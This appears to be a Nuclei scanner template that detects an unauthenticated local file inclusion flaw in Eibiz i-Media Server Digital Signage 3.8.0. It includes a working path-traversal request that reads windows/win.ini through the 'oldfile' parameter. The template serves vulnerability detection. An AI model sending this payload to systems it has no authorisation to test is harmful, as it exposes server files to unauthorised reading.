id: eibiz-lfi

info:
  name: Eibiz i-Media Server Digital Signage 3.8.0 - Local File Inclusion
  author: 0x_akoko
  severity: high
  description: Eibiz i-Media Server Digital Signage 3.8.0 is vulnerable to local file inclusion. An unauthenticated remote attacker can exploit this to view the contents of files located outside of the server's root directory. The issue can be triggered through the oldfile GET parameter.
  reference:
    - https://packetstormsecurity.com/files/158943/Eibiz-i-Media-Server-Digital-Signage-3.8.0-File-Path-Traversal.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  metadata:
    max-request: 1
  tags: lfi,eibiz,packetstorm,windows

http:
  - method: GET
    path:
      - "{{BaseURL}}/dlibrary/null?oldfile=../../../../../../windows/win.ini&library=null"

    matchers:
      - type: word
        part: body
        words:
          - "bit app support"
          - "fonts"
          - "extensions"
        condition: and
# digest: 4a0a00473045022023fb057d75af76c5b30d0566d3816d73bb2400cbf15469593c0af9fcf4ed9a95022100b0ebe50edeba68919342ae20fc18c1a482b36f42626a34f82870e5b07beffe6f:922c64590222798bb761d5b6d8e72950